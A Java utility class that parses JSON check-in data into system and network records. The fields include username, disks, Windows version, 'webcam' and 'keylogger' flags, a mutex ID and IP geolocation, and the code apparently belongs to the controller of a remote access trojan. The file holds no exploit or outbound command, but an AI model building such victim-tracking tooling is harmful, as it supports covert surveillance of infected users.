package Utils;

import Packets.SysNetInfo.Information;
import Packets.SysNetInfo.NetworkInformation;
import Packets.SysNetInfo.SystemInformation;
import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;

public class Converter {
    public static Information convertJSON2NetAndSysInfo(JSONObject jsonObject) {
        String operatingSystem = jsonObject.getString("win_ver");
        String userProfile = jsonObject.getString("user_profile");
        String homePath = jsonObject.getString("home_path");
        String homeDrive = jsonObject.getString("home_drive");
        String username = jsonObject.getString("username");
        JSONArray userDisksJsonArray = jsonObject.getJSONArray("disks");
        List<String> listOfDisks = userDisksJsonArray.toList().stream()
                .map(Object::toString)
                .toList();
        String tagName = jsonObject.getString("tag_name");
        boolean webcam = jsonObject.getBoolean("webcam");
        boolean keylogger = jsonObject.getBoolean("keylogger");
        String uuid = jsonObject.getString("mutex");
        SystemInformation systemInformation = new SystemInformation(operatingSystem, userProfile, homePath, homeDrive, username, listOfDisks, tagName, webcam, keylogger, uuid);
        String ip = jsonObject.getString("query");
        String internetCompanyName = jsonObject.getString("isp");
        String userContinent = jsonObject.getString("continent");
        String userCountry = jsonObject.getString("country");
        String userRegion = jsonObject.getString("region");
        String userCity = jsonObject.getString("city");
        String userZone = jsonObject.getString("timezone");
        double lat = jsonObject.getDouble("lat");
        double lon = jsonObject.getDouble("lon");
        String userCurrency = jsonObject.getString("currency");
        boolean userProxy = jsonObject.getBoolean("proxy");
        NetworkInformation networkInformation = new NetworkInformation(ip, internetCompanyName, userContinent, userCountry, userRegion, userCity, userZone, userCurrency, userProxy, lat, lon);
        return new Information(systemInformation, networkInformation);
    }
}
